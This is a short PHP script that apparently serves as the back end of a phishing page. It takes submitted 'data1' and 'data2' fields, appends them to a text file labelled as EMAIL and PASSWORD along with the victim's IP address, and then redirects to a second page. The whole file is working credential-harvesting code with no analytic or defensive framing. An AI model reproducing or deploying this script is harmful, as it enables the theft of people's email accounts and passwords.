<?php 

if(isset($_POST['data1']) || isset($_POST['data2'])) {
	$data1 = $_POST['data1'];
    $data2  = $_POST['data2'];
	$ip    = $_SERVER['REMOTE_ADDR'];

	if(empty($data1)) {
		echo "<scrip>alert('Complete All Data!'); document.location='./';</script>";
	}  
    if(empty($data2)) {
        echo "<scrip>alert('Complete All Data!'); document.location='./';</script>";
        } else
    {
        $file = "----bulan-07-Gasss-Pollll--.txt";
        
        $handle = fopen($file, 'a');
        fwrite($handle, "=======================================");
        fwrite($handle, "\n");
        fwrite($handle, "::  EMAIL     :: ");
        fwrite($handle, "$data1");
        fwrite($handle, "\n");
        fwrite($handle, "::  PASSWORD  :: ");
        fwrite($handle, "$data2");
        fwrite($handle, "\n");
        fwrite($handle, "::  IP        :: ");
        fwrite($handle, "$ip");
        fwrite($handle, "\n");
        if(fclose($handle)) {
            echo "<script>location.href='2.html';</script>";
        }
	}
}